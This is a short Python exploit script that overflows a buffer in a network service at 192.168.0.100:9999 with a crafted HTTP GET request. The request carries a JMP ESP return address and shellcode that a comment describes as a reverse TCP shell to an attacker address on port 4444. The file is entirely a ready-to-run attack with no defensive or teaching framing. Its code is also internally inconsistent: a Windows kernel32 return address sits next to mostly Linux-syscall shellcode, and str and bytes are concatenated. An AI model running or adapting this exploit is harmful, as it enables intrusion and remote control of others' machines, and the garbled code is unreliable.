import socket
import struct

host = "192.168.0.100"
port = 9999

buf = "A" * 2000

jmp_esp = struct.pack("<I", 0x7C874413)  # Address of JMP ESP instruction in kernel32.dll

nop_sled = "\x90" * 32

# Payload shellcode - reverse TCP shell to attacker IP 192.168.0.1 and port 4444
shellcode = (
    "\x31\xc0\x50\x68\x02\x00\x11\x5c\x89\xe0\x6a\x01\x6a\x02\x89"
    "\xe1\x31\xd2\xb2\x80\xcd\x2e\x80\xc2\x04\xcd\x2e\x31\xc0\x50"
    "\x68\x9c\x92\x9d\x77\x68\x02\x00\x11\x5c\x89\xe0\x6a\x10\x50"
    "\x51\x52\x89\xe1\xb0\x66\x31\xd2\x42\xcd\x80\x89\xd7\x31\xc0"
    "\x50\x50\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb0\x66\xb3"
    "\x03\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xd2\x31\xc9\xb1\x02"
    "\x89\xf3\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68"
    "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1"
    "\xb0\x0b\xcd\x80"
)

payload = buf + jmp_esp + nop_sled + shellcode

buf = "GET /" + payload + " HTTP/1.1\r\n"
buf += "Host: " + host + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buf)
s.close()
